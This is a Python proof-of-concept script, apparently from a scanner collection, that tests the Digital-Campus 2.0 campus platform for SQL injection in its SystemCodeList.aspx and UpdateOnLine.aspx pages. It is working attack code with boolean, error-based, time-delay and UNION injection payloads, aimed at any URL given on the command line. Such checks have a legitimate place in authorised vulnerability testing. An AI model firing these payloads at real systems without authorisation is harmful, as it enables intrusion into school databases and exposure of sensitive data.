#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Digital-Campus2.0数字校园平台Sql注射
referer: http://www.wooyun.org/bugs/wooyun-2010-083652
author: Lucifer
description: 1./Code/Common/SystemCodeList.aspx文件中,参数paramValue未过滤导致SQL注入,泄露敏感数据。
             2./Code/Common/UpdateOnLine.aspx文件中,参数UserID未过滤导致SQL注入,泄露敏感数据。
'''
import sys
import time
import requests
import warnings
from termcolor import cprint

class digital_campus_systemcodelist_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        reqlst = []
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = [r"/Code/Common/SystemCodeList.aspx?Method=GetCodeTepyBy&paramFileName=1&paramValue=1%27AnD%271%27=%271&paramRturnValue=1",
                    r"/Code/Common/SystemCodeList.aspx?Method=GetCodeTepyBy&paramFileName=1&paramValue=1%27AnD%271%27=%272&paramRturnValue=1"]
        for payload in payloads:
            vulnurl = self.url + payload
            try:
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                reqlst.append(str(req.text))

            except:
                cprint("[-] "+__file__+"====>连接超时", "cyan")

        if r"DayNum" in reqlst[0] and r"DayNum" in reqlst[1]:
            if len(reqlst[0]) != len(reqlst[1]):
                cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")

        payload = "/Code/Common/SystemCodeList.aspx?Method=GetCodeTepyBy&paramFileName=1&paramValue=1%27%20AnD%201=CoNvErt(Int,@@version)--&paramRturnValue=1"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 500 and r"Microsoft SQL Server" in req.text:
                cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

        payload = "/Code/Common/SystemCodeList.aspx?Method=GetCodeTepyBy&paramFileName=1&paramValue=1%27;WaItFor%20DeLaY%20%270:0:6%27--&paramRturnValue=1"
        vulnurl = self.url + payload
        start_time = time.time()
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

        payload = "/Code/Common/SystemCodeList.aspx?Method=GetCodeTepyBy&paramFileName=1&paramValue=1%27%20WaItFor%20DeLaY%20%270:0:6%27--&paramRturnValue=1"
        vulnurl = self.url + payload
        start_time = time.time()
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

        payload = "/Code/Common/SystemCodeList.aspx?Method=GetCodeTepyBy&paramFileName=1&paramValue=-1%27%20UnIoN%20AlL%20SeLeCt%20CHAR(113)+CHAR(%2781dc9bdb52d04dc20036dbd8313ed055%27)+CHAR(113)+CHAR(118)+CHAR(113)+(CASE%20WHEN%20(CONCAT(NULL,NULL)=CONCAT(NULL,NULL))%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END)+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)--&paramRturnValue=1"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

        payload = "/Code/Common/UpdateOnLine.aspx?Method=UpdateOnLineStatus&UserID=1%27;WaItFoR%20DeLaY%20%270:0:6%27--"
        vulnurl = self.url + payload
        start_time = time.time()
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = digital_campus_systemcodelist_sqli_BaseVerify(sys.argv[1])
    testVuln.run()